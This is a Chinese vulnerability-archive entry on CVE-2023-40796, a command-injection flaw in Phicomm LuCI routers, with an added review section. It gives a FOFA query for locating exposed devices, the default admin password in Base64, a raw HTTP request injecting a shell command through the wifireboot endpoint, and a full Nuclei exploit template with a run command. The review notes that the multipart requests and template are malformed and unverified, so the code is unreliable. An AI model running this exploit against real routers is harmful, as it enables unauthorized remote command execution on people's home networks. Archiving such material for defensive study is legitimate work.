---
cve: "CVE-2023-40796"
id: "vw-b4e5cb4dd016ed0d2f6de2de"
entity_id: "ve-b4e5cb4dd016ed0d2f6de2de"
schema_version: "1"
title: "斐讯 Phicomm 路由器 RCE 漏洞 (附 poc)"
product: "Phicomm LuCI路由器"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2023-40796"
referenced_identifiers: ""
prerequisites: "默认admin密码Base64值登录，提取stok/会话；型号固件缺失"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/PHICOMM/%E6%96%90%E8%AE%AF%20Phicomm%20%E8%B7%AF%E7%94%B1%E5%99%A8%20RCE%20%E6%BC%8F%E6%B4%9E%20%28%E9%99%84%20poc%29.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/wc6pRvxcB-Rp6jfrrd7x7A"
source_status: "recorded"
---

# 斐讯 Phicomm 路由器 RCE 漏洞 (附 poc)

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Phicomm LuCI路由器
- 本文讨论：CVE-2023-40796 wifireboot注入
- 版本、权限与配置前提：默认admin密码Base64值登录，提取stok/会话；型号固件缺失
- 资料类型：后台PoC/Nuclei模板；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 正文称页面只有用户名，模板却提交password=YWRtaW4=，需纠正为凭据要求
- multipart缺全部字段名和空行；Nuclei变量被反斜杠转义，reference None类型不规范，max-request1却2请求
- verified:true只是作者声明；uid/gid子串匹配不能替代真实命令输出
- 同722一个入口，Nuclei登录流程可互补但当前损坏
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 原始模板、固件及CVE归属待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wc6pRvxcB-Rp6jfrrd7x7A)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

斐讯 Phicomm 路由器 RCE 漏洞

02

—  

漏洞影响

Phicomm 路由器

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6eGXKf1AwlAVliaicQwNyCEtZyccChdzoZySicKOnic2x72g6qBoiba737J6w/640?wx_fmt=png)

03

—  

漏洞描述

斐讯 Phicomm 路由器是一款流行的家用路由器，默认登陆页面只有用户名，默认账号为 admin，该路由器后台管理界面存在远程命令执行漏洞。

  

04

—  

FOFA 搜索语句

```
icon_hash="-1344736688"

```

‍‍

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6ePjUaxCAHvqcRV82QvrSW6W2oYOOFx6Qq0SlojKdJ1sbsv2ibmzGeVYg/640?wx_fmt=png)

05

—  

漏洞复现

第一步，使用 admin 账号登陆，获取 cookie

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6ef6Hc9O2eY3g8Beda58RJfkEC4eQib8KLAQXPP3nEhhEbjFUfVrWuImw/640?wx_fmt=png)

第二步，发送如下数据包，在目标机器上执行 id 命令（POC14 行）  

```http
POST /cgi-bin/luci/;stok=bcd6ccd2fa5d212ce6431ca22f10b96d/admin/wifireboot HTTP/1.1
Host: x.x.x.x
Cookie: sysauth=第一步登录获取的cookie
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxbgjoytz
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
%s
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
12:00; id;
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
%s:
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
------WebKitFormBoundaryxbgjoytz--

```

其中路径中 stok 和 Cookie 的值从第一步获取

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6e7HSAtaF7PoF4Q6DicCxlctctxUvHLQGr3LbIjrlkicAXia4AiaHbVcK1Fg/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6eXpTLWXyW91X2617FnfPibEh7AvUT14y91gV4bbVc1bsFdefW4n2NYRg/640?wx_fmt=png)

证明存在漏洞

06

—  

nuclei poc

关注公众号，**回复** **0015** **获取 poc 源文件**。

poc 文件内容如下

```
id: CVE-2023-40796
info:
  name: 斐讯 Phicomm 路由器后台命令执行
  author: fgz
  severity: high
  description: |
    斐讯Phicomm路由器是一款流行的家用路由器，默认登陆页面只有用户名，默认账号为admin，该路由器后台管理界面存在远程命令执行漏洞。
  reference:
    None
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-1344736688"
  tags: rce
http:
  - raw:
      - |
        POST /cgi-bin/luci/admin/login HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Opera/8.16.(X11; Linux i686; nn-NO) Presto/2.9.183 Version/12.00
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 278
        Content-Type: application/x-www-form-urlencoded
        action_mode=apply&action_url=\{\{BaseURL\}\}/cgi-bin/luci/admin/login&username=admin&password=YWRtaW4=
      - |
        POST \{\{replace(api,'index','wifireboot')\}\} HTTP/1.1
        Host: \{\{Hostname\}\}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxbgjoytz
        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        %s
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        12:00; id;
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        %s:
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        ------WebKitFormBoundaryxbgjoytz--
    cookie-reuse: true
    extractors:
      - type: kval
        name: api
        internal: true
        part: header
        kval:
          - Location
    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200 && contains((body_2), 'uid') && contains((body_2), 'gid')"
        condition: and

```

运行 POC

```
.\nuclei.exe -t .\CVE-2023-40796.yaml -u http://x.x.x.x:30005

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOyvuDVu19tElwp2MufhD6sKibQzZiaXRjkj9JoJSibqXKJQB8GwtWqHVQcBz84RxXgIslEOU07N3UaQ/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
